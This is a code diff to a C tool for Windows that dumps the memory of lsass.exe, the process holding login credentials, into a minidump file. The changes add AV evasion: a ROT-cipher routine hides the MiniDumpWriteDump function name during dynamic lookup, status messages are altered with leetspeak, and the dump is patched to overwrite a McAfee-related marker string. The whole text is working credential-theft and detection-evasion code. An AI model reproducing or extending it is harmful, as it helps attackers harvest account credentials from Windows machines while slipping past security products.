@@ -201,6 +201,23 @@ char* find_str_in_data(const char* str, const char* data, int length){
 	return NULL;
 }
 
+char* MyRot(char* input, int key) {
+	char* output;
+	output = malloc(strlen(input) * sizeof(char));
+	int keysave = key;
+	for (int n = 0, len = strlen(input); n < len; n++){
+		int currentLetter = input[n];
+		char cipher = currentLetter + key;
+
+		if ((currentLetter - 'a') + key > 26){
+			key = ((currentLetter - 'a') + key) % 26;
+			cipher = 'a' + key;
+		}
+		output[n] = cipher;
+		key = keysave;
+	}
+	return output;
+}
 
 int wmain(int argc, wchar_t* argv[]) {
 	LPCWSTR lpwProcName = L"lsass.exe";
@@ -350,7 +367,6 @@ int wmain(int argc, wchar_t* argv[]) {
 	status = NtCreateFile(&hDmpFile, FILE_GENERIC_READ | FILE_GENERIC_WRITE, &FileObjectAttributes, &IoStatusBlock, 0,
 		FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
 
-
 	if (hDmpFile == INVALID_HANDLE_VALUE) {
 		wprintf(L"	[!] Failed to create dumpfile.\n");
 		ZwClose(hProcess);
@@ -358,6 +374,18 @@ int wmain(int argc, wchar_t* argv[]) {
 	}
 
 	DWORD dwTargetPID = GetProcessId(hProcess);
+
+	typedef BOOL(WINAPI* mafonction) (_In_ HANDLE hProcess, _In_ DWORD ProcessId, _In_ HANDLE hFile, _In_ MINIDUMP_TYPE DumpType, _In_opt_ PMINIDUMP_EXCEPTION_INFORMATION ExceptionParam,
+		_In_opt_ PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam, _In_opt_ PMINIDUMP_CALLBACK_INFORMATION CallbackParam);
+	HINSTANCE lib_handle;
+	lib_handle = LoadLibrary(TEXT("dbghelp.dll"));
+	mafonction mydumpfonction = (mafonction)GetProcAddress(lib_handle, MyRot("KglgBsknUpgrcBskn", 2)); //MiniDumpWriteDump with ROT2
+	if (!mydumpfonction) {
+		wprintf(L"	[!] Wr0ng Return of Address\n");
+		exit(1);
+	}
+	BOOL Success = mydumpfonction(hProcess, dwTargetPID, hDmpFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
+	/*
 	BOOL Success = MiniDumpWriteDump(hProcess,
 		dwTargetPID,
 		hDmpFile,
@@ -365,6 +393,7 @@ int wmain(int argc, wchar_t* argv[]) {
 		NULL,
 		NULL,
 		NULL);
+*/
 	if ((!Success))
 	{
 		wprintf(L"	[!] Failed to create minidump, error code: %x\n", GetLastError());
@@ -374,10 +403,9 @@ int wmain(int argc, wchar_t* argv[]) {
 	else {
 		wprintf(L"	[+] Dump succesful.\n");
 	}
-
-	
+		
 	const ULONG readSize = 2048;
-	Sleep(5000);
+	//Sleep(1000);
 	LARGE_INTEGER      byteOffset;
 	unsigned char szBuffer[2048];
 	char* s;
@@ -392,14 +420,12 @@ int wmain(int argc, wchar_t* argv[]) {
 			s = find_str_in_data(McAfeeString, szBuffer, readSize);
 			if ((s != NULL) || (byteOffset.LowPart >= 40000)) {
 				found = TRUE;
-				//DumpHex(szBuffer, readSize, byteOffset.LowPart); // used for debugging
 				szBuffer[s - szBuffer] = 'x';
 				szBuffer[s - szBuffer + 1] = 'x';
 				szBuffer[s - szBuffer + 2] = 'x';
 				szBuffer[s - szBuffer + 3] = 'x';
 				szBuffer[s - szBuffer + 4] = 'x';
 				wprintf(L"	[+] R3placing strIng at address %08X\n", s - szBuffer + byteOffset.LowPart);
-				//DumpHex(szBuffer, readSize, byteOffset.LowPart); // used for debugging
 				status = NtWriteFile(hDmpFile, NULL, NULL, NULL, &IoStatusBlock, &szBuffer, readSize, &byteOffset, NULL);
 			}
 			byteOffset.LowPart += readSize;
